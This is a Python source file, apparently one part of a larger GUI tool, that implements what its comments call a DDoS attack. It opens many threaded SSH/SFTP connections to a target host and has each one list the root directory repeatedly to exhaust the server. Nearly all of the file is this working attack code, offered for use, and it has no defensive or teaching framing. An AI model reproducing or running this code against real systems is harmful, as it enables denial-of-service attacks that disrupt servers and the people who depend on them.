import paramiko
import time
import tkinter as tk  # Import tkinter to use its components
from concurrent.futures import ThreadPoolExecutor  # Import ThreadPoolExecutor

# Define the number of threads for the DDoS attack
NUM_THREADS = 40  # Adjust this value to increase or decrease the attack volume

def attempt_listdir(host, port, user, password, output_text, stop_event):
    try:
        # Create a new SSH client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=user, password=password)

        # Create an SFTP client
        sftp = client.open_sftp()

        while not stop_event.is_set():  # Check for stop signal
            # List the directory contents
            output = sftp.listdir('/')
            output_text.insert(tk.END, f"[DDoS] Directory contents: {output}\n")  # Send output to ftp.py window

            time.sleep(0.1)  # Adjust the delay as needed

    except Exception as e:
        output_text.insert(tk.END, f"[DDoS] Error: {str(e)}\n")  # Handle errors
    finally:
        sftp.close()
        client.close()

def perform_ddos(host, port, user, password, output_text, stop_event):
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        while not stop_event.is_set():  # Check for stop signal
            # Submit multiple directory listing attempts
            for _ in range(NUM_THREADS):
                executor.submit(attempt_listdir, host, port, user, password, output_text, stop_event)
            # time.sleep(0.1)  # Adjust the delay as needed